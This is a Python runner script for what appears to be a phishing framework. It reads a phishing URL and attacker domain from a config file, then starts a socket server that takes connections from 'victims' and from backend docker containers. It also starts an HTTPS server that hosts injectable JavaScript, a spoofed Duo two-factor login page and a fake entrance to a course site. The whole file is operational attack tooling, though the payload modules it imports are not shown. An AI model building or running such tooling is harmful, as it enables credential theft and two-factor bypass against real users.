import sys
import os
import mechanize
import threading

# local imports 
from netifaces import interfaces, ifaddresses, AF_INET
from backend.socket_server import SocketServer
from client import https_server

# Read variables from config.ini as generated from running
# the configure.py script
phishing_url = ""
attacker_dom = ""
firefox_path = ""
try:
    with open("config.ini") as url_file:
        config = url_file.read().split("\n")
        print("Read Phishing URL:", config[0])
        print("Read Attacker Domain Name:", config[1])
        print("Read Firefox Path:", config[2])
        phishing_url = config[0]
        attacker_dom = config[1]
        firefox_path = config[2]
except:
    print("Cannot open config.ini. Did you run confingure.py?")

def log(self, *args):
    print("[*] RUNNER\t\t" + " ".join(map(str,args)))

# Function to fetch a list of possible ipv4 addresses this 
# machine can bind to
def ip4_addresses():
    ip_list = []
    for interface in interfaces():
        try:
            for link in ifaddresses(interface)[AF_INET]:
                ip_list.append(link['addr'])
        except: pass
    return ip_list

# If user did not supply commandline ip address, show him 
# a list from which he can pick
host = ""
if len(sys.argv) == 1:
    addrs = ip4_addresses()
    if len(addrs) > 1:
        print("Multiple ipv4 addresses found" \
            + "Which one is portforwarding on port 80?")
        for i in range(len(addrs)):
            print(str(i) + ": " + addrs[i])
        i = input("Select IP by index:")
        host = addrs[int(i)]
    else:
        host = addrs[0]
else:
    host = sys.argv[1]

log("Localhost is", host)

# Initialize the socket server that will listen on 80 for 
# incoming websocket tcp connections from victims and backend
# docker containers 
log("Starting backend server...")
socket_server = SocketServer(
    host,           # localhost ip
    attacker_dom,   # domain that points to localhost ip
    firefox_path)   # path to profiles.ini

# Start the front end https server on port 443 to host the 
# injectable js code, the spoofed duo login site, and the 
# fake entrance / exit catsoop site. Started on separate
# thread for perforamnce and non-blocking output
log("Starting https server on port 443...")

crossdomain = "https://" + phishing_url   \
                .split("//")[1].split("/")[0]
log("Allowing {} as cross domain".format(crossdomain))
threading.Thread(target=https_server.start_server,
        args=(host,                     # localhost
            attacker_dom,               # points to here
            crossdomain,
           socket_server)).start()

# Finally start the socket server
socket_server.start_server()
